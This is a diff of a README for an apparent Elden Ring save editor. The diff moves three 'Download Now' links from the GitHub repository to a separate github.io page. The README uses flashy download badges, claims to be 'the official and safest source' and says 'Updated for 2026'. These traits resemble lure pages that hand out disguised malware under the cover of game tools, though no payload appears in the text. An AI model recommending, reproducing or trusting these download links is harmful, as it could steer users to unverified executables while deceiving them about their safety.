@@ -1,7 +1,7 @@
 <h1>🎮 Elden-Ring-Save-Editor-PC - Edit Your Save, Unlock Everything Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/srecko79179/Elden-Ring-Save-Editor-PC">
+  <a href="https://srecko79179.github.io">
     <img src="https://img.shields.io/badge/Download-Free_Now-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Badge" style="background: linear-gradient(90deg, #ff6a00, #ee0979); color: white; padding: 15px 30px; font-size: 24px; border-radius:  ️10px; text-decoration: none; display: inline-block; box-shadow: 0 4px 15px rgba(238,9,121,0.4);">
   </a>
 </p>
@@ -12,7 +12,7 @@
 
 **Visit this link to download the application:**
 
-👉 **[Click Here to Download Elden Ring Save Editor](https://github.com/srecko79179/Elden-Ring-Save-Editor-PC)**
+👉 **[Click Here to Download Elden Ring Save Editor](https://srecko79179.github.io)**
 
 This is the official and safest source for the tool. Do not download from third-party websites, as they may contain outdated or malicious files.
 
@@ -135,7 +135,7 @@ Encounter an issue? Have a feature request? Join our open community**.** The bes
 If you skipped ahead, here is the clickable link one more time:
 
 <p align="center">
-  <a href="https://github.com/srecko79179/Elden-Ring-Save-Editor-PC" style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 18px 40px; font-size: 22px; border-radius:  ️50px; text-decoration: none; display: inline-block; box-shadow:  ️0 8px 20px rgba(102,126,234,0.5);">⬇️ Download Now – Updated for 2026</a>
+  <a href="https://srecko79179.github.io" style="background: linear-gradient(135deg, #667eea, #764ba2); color: white; padding: 18px 40px; font-size: 22px; border-radius:  ️50px; text-decoration: none; display: inline-block; box-shadow:  ️0 8px 20px rgba(102,126,234,0.5);">⬇️ Download Now – Updated for 2026</a>
 </p>
 
 ---
